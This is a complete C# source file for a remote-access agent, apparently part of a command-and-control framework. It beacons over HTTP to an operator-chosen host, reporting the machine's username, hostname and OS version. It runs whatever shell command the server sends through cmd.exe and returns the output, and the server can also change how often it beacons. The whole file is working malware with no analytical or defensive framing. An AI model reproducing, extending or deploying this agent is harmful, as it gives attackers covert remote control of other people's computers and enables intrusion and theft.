using System.Diagnostics;
using System.Net;
using System.Text.Json.Nodes;

namespace agentDotNet
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if(args.Length != 2)
            {
                Console.WriteLine("Usage: agentDotNet <host> <port>");
                return;
            }
            
            String serverUrl = "http://" + args[0] + ":" + args[1] + "/";
            Guid guid = Guid.NewGuid();
            int sleepTime = 2000;
            String result = null;
            string username = Environment.UserName;
            string hostname = Environment.MachineName;
            string os = Environment.OSVersion.ToString();

            while(true)
            {
                String webResponseStr = null;
                try
                {
                    JsonObject data = new JsonObject();
                    data["id"] = guid.ToString();
                    data["type"] = "dotNET";
                    data["username"] = username;
                    data["hostname"] = hostname;
                    data["os"] = os;
                    if(result != null)
                        data["result"] = result;
                    string json = data.ToString();
                    try
                    {
                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(serverUrl);
                        request.Method = "POST";
                        request.ContentType = "application/json";
                        using (var streamWriter = new StreamWriter(request.GetRequestStream()))
                        {
                            streamWriter.Write(json);
                            streamWriter.Flush();
                            streamWriter.Close();
                        }
                        HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                        using (var streamReader = new StreamReader(response.GetResponseStream()))
                        {
                            webResponseStr = streamReader.ReadToEnd();
                        }
                        response.Close();
                        result = null;
                        //Parse JSON response
                        data = JsonObject.Parse(webResponseStr).AsObject();

                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Thread.Sleep(sleepTime);
                        continue;
                    }
                    if(data == null || !data.ContainsKey("__type__"))
                    {
                        Thread.Sleep(sleepTime);
                        continue;
                    }
                    if (data["__type__"].ToString() == "my_what")
                    {
                        result = "I'm an C# agent";
                    }
                    else if (data["__type__"].ToString() == "my_sleep")
                    {
                        sleepTime = Int32.Parse(data["sleep"].ToString());
                        result = "New sleep is " + sleepTime;
                    }
                    else if (data["__type__"].ToString() == "my_terminal")
                    {
                        String cmd = data["command"].ToString();
                        Process process = new Process();
                        process.StartInfo.FileName = "cmd.exe";
                        process.StartInfo.Arguments = "/c " + cmd;
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.RedirectStandardOutput = true;
                        process.Start();
                        result = process.StandardOutput.ReadToEnd();
                    }
                    else if (data["__type__"].ToString() == "my_eval")
                    {
                        result = "I'm an C# agent, I cant eval that well";
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    if (result == null)
                        result = e.Message;
                }
                Thread.Sleep(sleepTime);
            }
        }
    }
}
